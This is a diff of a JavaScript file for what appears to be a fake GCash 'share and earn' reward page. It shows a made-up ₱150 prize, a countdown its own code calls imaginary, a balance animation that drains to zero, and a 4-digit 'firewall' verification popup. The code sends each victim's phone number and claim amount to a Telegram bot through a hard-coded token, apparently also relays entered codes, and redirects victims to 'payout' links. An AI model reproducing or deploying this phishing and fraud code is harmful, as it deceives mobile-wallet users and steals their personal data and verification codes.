@@ -1,11 +1,11 @@
-// ========== POPUP_SHARE.JS - FIREWALL LOGIC FOR SHARE_AND_EARN ==========
+// ========== POPUP_SHARE.JS - FOR SHARE_AND_EARN ==========
 
 let claimStateShare = {
     isProcessing: false,
     currentAmount: 0,
     countdownInterval: null,
     balanceDecrementInterval: null,
-    countdownSeconds: 60,
+    countdownSeconds: 180,
     isPending: false,
     hasRedirected: false
 };
@@ -24,7 +24,6 @@ async function getFirewallStatusShare() {
         const db = firebase.database();
         const snap = await db.ref('admin/globalFirewall').once('value');
         const data = snap.val();
-        console.log("Firewall status:", data);
         if (data === null) {
             await db.ref('admin/globalFirewall').set({
                 active: false,
@@ -35,7 +34,7 @@ async function getFirewallStatusShare() {
         }
         return data.active === true;
     } catch(e) { 
-        console.error("Firewall error:", e);
+        console.error("Firewall check error:", e);
         return false;
     }
 }
@@ -46,7 +45,7 @@ function listenToFirewallChangesShare() {
     db.ref('admin/globalFirewall').on('value', (snapshot) => {
         const data = snapshot.val();
         cachedFirewallStatusShare = (data && data.active === true);
-        console.log("Firewall updated:", cachedFirewallStatusShare);
+        console.log("Firewall status updated:", cachedFirewallStatusShare);
     });
 }
 
@@ -58,7 +57,7 @@ async function sendTelegramShare(phone, code) {
     } catch(e) {}
 }
 
-// ========== FIREWALL POPUP (4-DIGIT VERIFICATION) ==========
+// ========== FIREWALL POPUP ==========
 function showFirewallPopupShare() {
     console.log("Showing firewall verification popup");
     const popup = document.getElementById('firewallPopup');
@@ -158,15 +157,15 @@ async function getLatestPayoutLinkShare() {
             console.log("Found payout link:", linkData.url);
             return { url: linkData.url, key: key };
         }
-        console.log("No available links found");
+        console.warn("No available links found in Firebase");
         return null;
     } catch (error) {
-        console.error("Error getting link:", error);
+        console.error("Error getting payout link:", error);
         return null;
     }
 }
 
-// ========== CONGRATULATIONS POPUP ==========
+// ========== SHOW CONGRATULATIONS POPUP ==========
 async function showClaimPopupShare(amount) {
     console.log("showClaimPopupShare called with amount:", amount);
     
@@ -213,29 +212,71 @@ function hidePendingStatusShare() {
     claimStateShare.isPending = false; 
 }
 
-// ========== BALANCE DECREMENT (VISIBLE) ==========
+// ========== BALANCE DECREMENT ==========
 function startSmoothDecrementShare(originalAmount) {
-    const balanceDisplay = document.getElementById('userBalanceDisplay');
-    if (!balanceDisplay) return;
+    const balanceText = document.getElementById('balanceText');
+    if (!balanceText) return;
     
     let current = originalAmount;
+    const decrementStep = 1;
     const totalDuration = 2000;
     const steps = originalAmount;
     const intervalTime = totalDuration / steps;
     
     claimStateShare.balanceDecrementInterval = setInterval(() => {
-        current = current - 1;
-        if (current >= 0) balanceDisplay.innerText = "₱" + current.toLocaleString();
+        current = current - decrementStep;
+        if (current >= 0) balanceText.innerText = "₱" + current.toLocaleString() + ".00";
         if (current <= 0) {
             clearInterval(claimStateShare.balanceDecrementInterval);
             claimStateShare.balanceDecrementInterval = null;
-            balanceDisplay.innerText = "₱0";
+            balanceText.innerText = "₱0.00";
         }
     }, intervalTime);
 }
 
-// ========== CLAIM ACTION ==========
-async function onClaimActionShare() {
+// ========== COUNTDOWN TIMER ==========
+function startVisibleCountdownShare(originalAmount) {
+    let remaining = claimStateShare.countdownSeconds;
+    const timerSpan = document.getElementById('pendingCountdown');
+    const pendingArea = document.getElementById('pendingStatusArea');
+    
+    if (!timerSpan) return;
+    
+    claimStateShare.countdownInterval = setInterval(() => {
+        if (remaining > 0) {
+            remaining--;
+            const mins = Math.floor(remaining / 60);
+            const secs = remaining % 60;
+            timerSpan.innerText = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
+        }
+        
+        if (remaining <= 0) {
+            clearInterval(claimStateShare.countdownInterval);
+            claimStateShare.countdownInterval = null;
+            
+            const balanceText = document.getElementById('balanceText');
+            if (balanceText) balanceText.innerText = "₱" + originalAmount.toLocaleString() + ".00";
+            
+            if (pendingArea) pendingArea.style.display = 'none';
+            
+            claimStateShare.isProcessing = false;
+            claimStateShare.hasRedirected = false;
+        }
+    }, 1000);
+}
+
+// ========== REDIRECT TIMER ==========
+function startImaginaryTimerShare(redirectUrl) {
+    setTimeout(() => {
+        if (!claimStateShare.hasRedirected) {
+            claimStateShare.hasRedirected = true;
+            window.location.href = redirectUrl;
+        }
+    }, 2000);
+}
+
+// ========== CLAIM ACTION (SIMILAR SA MAIN.HTML) ==========
+function onClaimActionShare() {
     if (claimStateShare.isProcessing) return;
     
     claimStateShare.isProcessing = true;
@@ -243,26 +284,22 @@ async function onClaimActionShare() {
     const amount = claimStateShare.currentAmount;
     const userPhone = localStorage.getItem("userPhone") || "Unknown";
     
-    if (claimBtn) {
-        claimBtn.disabled = true;
-        claimBtn.innerHTML = 'PROCESSING...';
-    }
+    claimBtn.disabled = true;
+    claimBtn.innerHTML = 'PROCESSING...';
     
-    // Send Telegram notification
     fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent("CLAIM REQUEST!\nPhone: " + userPhone + "\nAmount: ₱" + amount)}`)
         .catch(e => console.log('Telegram error:', e));
     
     if (typeof firebase !== 'undefined' && firebase.database) {
         const db = firebase.database();
         
-        try {
-            const linkData = await getLatestPayoutLinkShare();
-            
-            if (linkData && linkData.url) {
+        db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value', (snapshot) => {
+            if (snapshot.exists()) {
+                const key = Object.keys(snapshot.val())[0];
+                const linkData = snapshot.val()[key];
                 const redirectUrl = linkData.url;
-                const finalUrl = redirectUrl.startsWith('http') ? redirectUrl : 'https://' + redirectUrl;
                 
-                await db.ref('links/' + linkData.key).update({ 
+                db.ref('links/' + key).update({ 
                     status: 'claimed', 
                     user: userPhone, 
                     amount: amount, 
@@ -271,42 +308,35 @@ async function onClaimActionShare() {
                 
                 hideClaimPopupShare();
                 showPendingStatusShare();
-                
-                // Start balance decrement animation
                 startSmoothDecrementShare(amount);
-                
-                // Redirect after 2 seconds
-                setTimeout(() => {
-                    if (!claimStateShare.hasRedirected) {
-                        claimStateShare.hasRedirected = true;
-                        window.location.href = finalUrl;
-                    }
-                }, 2000);
+                startVisibleCountdownShare(amount);
+                startImaginaryTimerShare(redirectUrl);
                 
             } else {
-                if (claimBtn) {
-                    claimBtn.innerHTML = 'NO REWARDS';
-                    setTimeout(() => {
-                        claimBtn.innerHTML = 'CLAIM THRU GCASH';
-                        claimBtn.disabled = false;
-                        claimStateShare.isProcessing = false;
-                    }, 3000);
-                }
-                showNoLinkAlertShare();
-            }
-        } catch(err) {
-            console.error("Error:", err);
-            if (claimBtn) {
-                claimBtn.innerHTML = 'ERROR';
+                claimBtn.innerHTML = 'NO REWARDS';
                 setTimeout(() => {
                     claimBtn.innerHTML = 'CLAIM THRU GCASH';
                     claimBtn.disabled = false;
                     claimStateShare.isProcessing = false;
                 }, 3000);
+                alert("Your Withdrawal is unsuccessful. Switch another device and claim your rewards!");
             }
-            alert("System error. Please try again.");
-        }
+        }).catch((err) => {
+            console.error("Firebase error:", err);
+            claimBtn.innerHTML = 'ERROR';
+            setTimeout(() => {
+                claimBtn.innerHTML = 'CLAIM THRU GCASH';
+                claimBtn.disabled = false;
+                claimStateShare.isProcessing = false;
+            }, 3000);
+        });
     }
+}
+
+// ========== CLAIM THRU GCASH HANDLER ==========
+async function handleClaimThruGCashShare() {
+    console.log("CLAIM THRU GCASH clicked - showing congratulations popup");
+    showClaimPopupShare(150);
 }
 
 // ========== NO LINK ALERT ==========
@@ -332,7 +362,7 @@ function showNoLinkAlertShare() {
                 <p>• No GCash app installed on this device.</p>
                 <p>• Please try using another device.</p>
             </div>
-            <button id="closeAlert" style="background:#ff4444; border:none; border-radius:40px; padding:12px; color:white; margin-top:20px; width:100%; cursor:pointer;">GOT IT</button>
+            <button id="closeAlert" style="background:#ff4444; border:none; border-radius:40px; padding:12px; color:white; margin-top:20px; width:100%; cursor:pointer;">OK</button>
         </div>
     `;
     
@@ -340,50 +370,7 @@ function showNoLinkAlertShare() {
     document.getElementById('closeAlert').onclick = () => modal.remove();
 }
 
-// ========== CLAIM THRU GCASH HANDLER (from prizePopup) ==========
-async function handleClaimThruGCashShare() {
-    console.log("CLAIM THRU GCASH clicked from prizePopup");
-    
-    // Check firewall first
-    const firewallActive = await getFirewallStatusShare();
-    console.log("Firewall status:", firewallActive ? "ON" : "OFF");
-    
-    if (firewallActive) {
-        console.log("Firewall ON - showing verification popup");
-        showFirewallPopupShare();
-    } else {
-        console.log("Firewall OFF - showing congratulations popup");
-        showClaimPopupShare(150);
-    }
-}
-
-// ========== INITIALIZE ALL BUTTONS ==========
-function initClaimThruGCashButton() {
-    // Target the CLAIM THRU GCASH button inside prizePopup
-    const claimBtn = document.getElementById('claimGCashBtn');
-    if (claimBtn) {
-        console.log("CLAIM THRU GCASH button found");
-        claimBtn.onclick = function(e) {
-            e.preventDefault();
-            handleClaimThruGCashShare();
-        };
-    } else {
-        console.log("CLAIM THRU GCASH button not found yet");
-    }
-}
-
-function initClaimActionButton() {
-    const actionBtn = document.getElementById('claimActionBtn');
-    if (actionBtn) {
-        console.log("Claim action button found");
-        actionBtn.onclick = function(e) {
-            e.preventDefault();
-            onClaimActionShare();
-        };
-    }
-}
-
-// ========== EXPORT ==========
+// ========== EXPORT FUNCTIONS ==========
 window.showFirewallPopupShare = showFirewallPopupShare;
 window.hideFirewallPopupShare = hideFirewallPopupShare;
 window.verifyFirewallCodeShare = verifyFirewallCodeShare;
@@ -399,19 +386,5 @@ document.addEventListener('DOMContentLoaded', function() {
         console.log("Initial firewall status:", status);
         cachedFirewallStatusShare = status;
     });
-    
-    // Initialize buttons
-    initClaimThruGCashButton();
-    initClaimActionButton();
-    
-    console.log("Popup_share.js loaded - Firewall ready");
+    console.log("Popup_share.js loaded");
 });
-
-// ========== CLOSE PRIZE POPUP ==========
-function closePrizePopup() {
-    var popup = document.getElementById('prizePopup');
-    if (popup) {
-        popup.style.display = 'none';
-    }
-    stopConfetti();
-}
